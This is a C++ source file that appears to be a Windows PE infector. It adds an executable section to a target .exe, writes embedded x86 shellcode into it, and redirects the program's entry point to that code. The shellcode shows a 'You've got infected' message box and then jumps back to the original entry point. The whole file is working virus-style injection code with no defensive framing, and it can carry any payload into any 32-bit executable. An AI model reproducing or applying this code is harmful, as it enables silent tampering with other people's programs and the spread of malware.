#include <stdio.h>
#include <windows.h>
#include <string.h>


DWORD align(DWORD size, DWORD align, DWORD addr) {
    if(!(size % align)) {
        return addr + size;
    }
    return addr + (size / align + 1) * align;
}

bool AddSection(char* filename, char *sectionName, DWORD sizeofSection) {
    HANDLE hFile = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if(hFile == INVALID_HANDLE_VALUE) {
        return false; // Failed to open file
    }
    
    DWORD dwFileSize = GetFileSize(hFile, nullptr);
    if(dwFileSize == INVALID_FILE_SIZE) {
        return false; // Failed to get file size
    }

    BYTE *pByte = new BYTE[dwFileSize];
    DWORD dw;
    ReadFile(hFile, pByte, dwFileSize, &dw, nullptr);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return false; // Not a valid PE file
    }

    auto pNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)pByte + pDosHeader->e_lfanew);
    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE) {
        return false; // Not a valid PE file
    }
    PIMAGE_FILE_HEADER FileHeader = &pNtHeader->FileHeader;
    PIMAGE_OPTIONAL_HEADER32 OptionalHeader = &pNtHeader->OptionalHeader;
    auto pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeader + sizeof(IMAGE_NT_HEADERS32));
    if (pSectionHeader == nullptr) {
        return false; // No section header
    }
    int sectionNumber = FileHeader->NumberOfSections;
    ZeroMemory(&pSectionHeader[sectionNumber], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&pSectionHeader[sectionNumber].Name, sectionName, 8);

    pSectionHeader[sectionNumber].Misc.VirtualSize = align(sizeofSection, OptionalHeader->SectionAlignment, 0);
    pSectionHeader[sectionNumber].VirtualAddress = align(
        pSectionHeader[sectionNumber - 1].Misc.VirtualSize, 
        OptionalHeader->SectionAlignment, 
        pSectionHeader[sectionNumber - 1].VirtualAddress
        );
    pSectionHeader[sectionNumber].SizeOfRawData = align(sizeofSection, OptionalHeader->FileAlignment, 0);
    pSectionHeader[sectionNumber].PointerToRawData = align(
        pSectionHeader[sectionNumber - 1].SizeOfRawData, 
        OptionalHeader->FileAlignment, 
        pSectionHeader[sectionNumber - 1].PointerToRawData
        );
    pSectionHeader[sectionNumber].Characteristics = 0xE00000E0;
    // 0xE00000E0 = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_CNT_UNINITIALIZED_DATA

    SetFilePointer(
        hFile,
        pSectionHeader[sectionNumber].PointerToRawData + pSectionHeader[sectionNumber].SizeOfRawData,
        nullptr, 
        FILE_BEGIN
        );
    // Set file pointer to the end of the file
    SetEndOfFile(hFile);

    OptionalHeader->SizeOfImage = pSectionHeader[sectionNumber].VirtualAddress + pSectionHeader[sectionNumber].Misc.VirtualSize;
    FileHeader->NumberOfSections += 1;

    SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
    WriteFile(hFile, pByte, dwFileSize, &dw, nullptr);
    CloseHandle(hFile);
    return true;
}

bool AddCode(char *filepath) {
    HANDLE hFile = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if(hFile == INVALID_HANDLE_VALUE) {
        return false; // Failed to open file
    }
    
    DWORD dwFileSize = GetFileSize(hFile, nullptr);
    if(dwFileSize == INVALID_FILE_SIZE) {
        return false; // Failed to get file size
    }

    BYTE *pByte = new BYTE[dwFileSize];
    DWORD dw;
    ReadFile(hFile, pByte, dwFileSize, &dw, nullptr);
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    auto pNtHeader = (PIMAGE_NT_HEADERS32)((DWORD)pByte + pDosHeader->e_lfanew);
    PIMAGE_FILE_HEADER pFileHeader = &pNtHeader->FileHeader;
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = &pNtHeader->OptionalHeader;
    PIMAGE_SECTION_HEADER pFisrtSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
    PIMAGE_SECTION_HEADER pLastSectionHeader = pFisrtSectionHeader + pNtHeader->FileHeader.NumberOfSections - 1;

    SetFilePointer(
        hFile,
        pLastSectionHeader->PointerToRawData,
        nullptr, 
        FILE_BEGIN
        );
    char *shellcode1 = "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64" 
"\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e" 
"\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60" 
"\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b" 
"\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01" 
"\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d" 
"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01" 
"\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01" 
"\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89" 
"\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45" 
"\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff" 
"\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64" 
"\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56" 
"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24" 
"\x52\xe8\x5f\xff\xff\xff\x68\x72\x58\x20\x20\x68\x45\x72" 
"\x72\x6f\x31\xdb\x88\x5c\x24\x05\x89\xe3\x68\x74\x65\x64" 
"\x58\x68\x6e\x66\x65\x63\x68\x6f\x74\x20\x69\x68\x76\x65" 
"\x20\x67\x68\x59\x6f\x75\x27\x31\xc9\x88\x4c\x24\x13\x89" 
"\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50" 
"\x68";

    WriteFile(hFile, shellcode1, strlen(shellcode1), &dw, nullptr);
    // SetFilePointer(hFile, 1, nullptr, FILE_CURRENT);
    DWORD oldAddress = pOptionalHeader->AddressOfEntryPoint + pOptionalHeader->ImageBase;
    for (int i = 0; i < 4; i++) {
        BYTE b = (BYTE)(oldAddress >> (i * 8));
        printf("%x ", b);
        WriteFile(hFile, &b, 1, &dw, nullptr);
    }

    char *shellcode2 = "\xc3";
    WriteFile(hFile, shellcode2, strlen(shellcode2), &dw, nullptr);
    CloseHandle(hFile);
    return true;
}

void changeEntryPoint(char* filepath) {
    HANDLE hFile = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    DWORD dwFileSize = GetFileSize(hFile, nullptr);
    BYTE *pByte = new BYTE[dwFileSize];
    DWORD dw;
    ReadFile(hFile, pByte, dwFileSize, &dw, nullptr);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
    PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)&pNtHeader->FileHeader;
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNtHeader->OptionalHeader;
    PIMAGE_SECTION_HEADER pFisrtSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
    PIMAGE_SECTION_HEADER pLastSectionHeader = pFisrtSectionHeader + pNtHeader->FileHeader.NumberOfSections - 1;
    pOptionalHeader->AddressOfEntryPoint = pLastSectionHeader->VirtualAddress;
    SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
    WriteFile(hFile, pByte, dwFileSize, &dw, nullptr);
    CloseHandle(hFile);

}

int main(int argc, char *argv[]) {
    // printf("LittleEndian: %x", littlEndian(0x12345678));
    char* lpFilePath;
    if (argc == 2) {
        lpFilePath = argv[1];
    } else {
        printf("Usage: shellcode.exe <filePath>\n");
        return 0;
    }
    if (AddSection(lpFilePath, ".code",400)) {
        printf("Section added!\n");
        if (AddCode(lpFilePath)) {
            printf("Code added!\n");
        } else {
            printf("Error adding code!\n");
        }
    } else {
        printf("Error adding section!\n");
    }
    changeEntryPoint(lpFilePath);
    return 0;
}